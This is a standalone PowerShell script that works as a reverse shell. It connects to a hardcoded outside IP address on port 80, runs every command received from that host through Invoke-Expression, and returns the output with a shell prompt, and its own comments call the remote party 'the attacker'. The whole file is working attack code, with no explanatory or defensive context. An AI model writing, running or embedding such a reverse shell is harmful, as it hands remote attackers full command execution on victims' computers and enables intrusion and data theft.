$ip = "151.248.146.70"  
$port = 80         
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding
$writer.WriteLine("Connected to ${ip}:${port}")
try {
    while ($stream.CanRead -and ($client.Connected -eq $true)) {
        try {
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -le 0) {
                break  
            }
            $data = $encoding.GetString($buffer, 0, $bytesRead)

            try {
                
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            } catch {
                # Catch any errors from invalid commands and send them back
                $sendback = "Error: $($_.Exception.Message)`n"
            }

            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
            $sendbackBytes = $encoding.GetBytes($sendback2)
            $stream.Write($sendbackBytes, 0, $sendbackBytes.Length)
            $stream.Flush()
        } catch {
            # Catch any stream read/write errors, which usually happen when the attacker disconnects
            break
        }
    }
} catch {
    $writer.WriteLine("Connection closed.")
} finally {
    $client.Close()
    exit
}
